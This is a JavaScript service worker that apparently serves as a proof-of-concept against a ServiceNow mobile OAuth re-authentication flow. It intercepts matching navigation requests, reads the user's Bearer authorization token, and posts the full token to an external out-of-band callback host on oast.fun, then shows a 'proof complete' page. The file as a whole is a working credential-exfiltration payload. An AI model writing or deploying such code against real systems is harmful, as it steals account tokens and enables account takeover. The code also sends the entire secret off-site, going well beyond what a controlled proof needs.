'use strict';

const OAST_BASE = 'https://erfqqzdagbcinnxaylnh2h036s9jiqe6u.oast.fun';
const MARKER_RE = /^CODEX_NOW_[A-Z0-9]+$/;

self.addEventListener('install', event => {
  event.waitUntil(self.skipWaiting());
});

self.addEventListener('activate', event => {
  event.waitUntil(self.clients.claim());
});

self.addEventListener('fetch', event => {
  if (event.request.mode !== 'navigate') {
    return;
  }

  const url = new URL(event.request.url);
  const marker = url.searchParams.get('marker') || '';
  const isProof =
    url.searchParams.get('proof') === 'CODEX_NOW_MOBILE_REAUTH' &&
    url.searchParams.has('oauth_initiator.do') &&
    MARKER_RE.test(marker);
  if (!isProof) {
    return;
  }

  const authorization = event.request.headers.get('authorization');
  if (!authorization || !authorization.startsWith('Bearer ')) {
    return;
  }

  const callbackUrl = OAST_BASE + '/servicenow-now-mobile/' +
    encodeURIComponent(marker) + '?authorization_length=' +
    encodeURIComponent(String(authorization.length));
  const body = 'marker=' + marker + '\nAuthorization: ' + authorization + '\n';

  event.waitUntil(
    fetch(callbackUrl, {
      method: 'POST',
      mode: 'no-cors',
      credentials: 'omit',
      cache: 'no-store',
      keepalive: true,
      body: body
    }).catch(() => undefined)
  );

  event.respondWith(new Response(
    '<!doctype html><meta charset="utf-8"><title>Proof complete</title>' +
    '<p>Controlled proof complete. The disposable account can now be deleted.</p>',
    {
      status: 200,
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'no-store'
      }
    }
  ));
});
